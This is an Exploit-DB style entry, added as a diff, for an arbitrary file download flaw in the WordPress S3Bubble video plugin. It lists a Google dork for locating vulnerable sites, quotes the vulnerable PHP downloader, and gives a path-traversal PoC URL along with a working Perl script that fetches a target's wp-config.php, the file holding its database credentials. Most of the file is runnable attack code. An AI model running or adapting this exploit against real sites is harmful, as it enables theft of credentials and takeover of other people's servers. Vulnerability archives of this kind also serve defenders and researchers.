@@ -1,0 +1,70 @@
+# Exploit Title: Wordpress S3Bubble Cloud Video With Adverts & Analytics - Arbitrary File Download
+# Google Dork: inurl:/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/
+# Date: 04/07/2015
+# Exploit Author: CrashBandicot @DosPerl
+# Vendor Homepage: https://s3bubble.com
+# Software Link: https://wordpress.org/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/
+# Version: 0.7
+# Tested on: MSWin32
+
+#EDB note: updated Software link to correct plugin.
+
+# Vulnerable File : /wp-content/plugins/..../assets/plugins/ultimate/content/downloader.php
+
+<?php 
+   header("Content-Type: application/octet-stream");
+   header("Content-Disposition: attachment; filename=". $_GET['name']);
+   $path = urldecode($_GET['path']);
+   if(isset($path))readfile($path);
+?>
+
+
+# PoC : http://127.0.0.1/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php
+
+
+# Exploit : 
+
+
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+ 
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+ 
+if(@ARGV < 2)
+{
+die("\n\n[+] usage : perl $0 site.com /path/");
+}
+
+print q{
+       Wordpress S3Bubble Cloud Video With Adverts & Analytics - Arbitrary File Download
+                           ->CrashBandicot
+ 
+ 
+};
+
+($Target,$path) = @ARGV;
+
+if($Target !~ /^(http|https):\/\//)
+{
+$Target = "http://$Target";
+}
+
+$xpl = "/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php";
+my $url = $Target.$path.$xpl;
+print "\n [?] Exploiting ...... \n\n";
+ 
+$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+$req = $ua->get($url,":content_file" => "wp-config.php");
+ 
+if ($req->is_success)
+{
+print "[+] $url Exploited!\n\n";
+print "[+] File save to name : wp-config.php\n";
+}
+else
+{
+die("[!] Exploit Failed !\n");
+}
+
+_END_
